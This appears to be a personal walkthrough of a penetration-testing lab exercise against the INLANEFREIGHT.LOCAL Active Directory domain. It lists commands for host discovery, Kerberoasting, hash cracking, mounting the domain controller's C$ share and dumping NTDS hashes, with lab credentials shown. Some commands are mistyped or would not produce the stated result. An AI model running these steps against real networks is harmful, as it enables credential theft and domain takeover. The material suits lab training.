### Connect to the testing VM using Xfreerdp and practice testing, documentation, and reporting against the target lab. Once the target spawns, browse to the WriteHat instance on port 443 and authenticate with the provided admin credentials. Play around with the tool and practice adding findings to the database to get a feel for the reporting tools available to us. Remember that all data will be lost once the target resets, so save any practice findings locally! Next, complete the in-progress penetration test. Once you achieve Domain Admin level access, submit the contents of the flag.txt file on the Administrator Desktop on the DC01 host.

Our target is on `ens224`
```shell
route -n
```
![](Screenshot%202026-08-29%20at%2017.07.50.png)

```shell 
fping -asgq 172.16.4.0/23 > alive_host.txt
```
![](Screenshot%202026-08-29%20at%2017.09.56.png)

```shell
sudo nmap -sS -sU -p 53 -iL alive_host.txt
```
![](Screenshot%202026-08-29%20at%2017.11.43.png)

I saw 172.16.5.5 is a dns network server
```shell
nslookup DC01.INLANEFREIGHT.LOCAL 172.16.5.5
```
![](Screenshot%202026-08-29%20at%2017.13.22.png)

Next open `Obsidian` on target host
![](Screenshot%202026-08-29%20at%2017.14.40.png)
![](Screenshot%202026-08-29%20at%2017.15.40.png)

```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/asmith -request-user solarwindsmonitor
```
![](Screenshot%202026-08-29%20at%2017.20.06.png)
![](Screenshot%202026-08-29%20at%2017.20.55.png)

```shell
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```
![](Screenshot%202026-08-29%20at%2017.22.30.png)

```shell
sudo crackmapexec smb 172.16.5.5 -u solarwindsmonitor -p Solar1010 --shares
```
![](Screenshot%202026-08-29%20at%2017.23.57.png)

```shell
sudo mount -t cifs //172.16.5.5/"C$" loot -o username=solarwindsmonitor,password=Solar1010
```
![](Screenshot%202026-08-29%20at%2017.26.56.png)
### After achieving Domain Admin, submit the NTLM hash of the KRBTGT account.

```shell
crackmapexec smb 172.16.5.5 -u solarwindsmonitor -p Solar1010 | grep krbtgt
```
### Dump the NTDS file and perform offline password cracking. Submit the password of the svc_reporting user as your answer.

```shell
smb 172.16.5.5 -u solarwindsmonitor -p Solar1010 --ntds | grep svc_reporting
```
![](Screenshot%202026-08-29%20at%2017.49.38.png)

```shell
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```
![](Screenshot%202026-08-29%20at%2017.51.35.png)
### What powerful local group does this user belong to?

```shell
ldapsearch -x -H ldap://172.16.5.5 -D "solarwindsmonitor@INLANEFREIGHT.LOCAL" -w "Solar1010" -b "DC=INLANEFREIGHT,DC=LOCAL" "(samaccountname=svc_reporting)" memberof
```
![](Screenshot%202026-08-29%20at%2017.55.23.png)
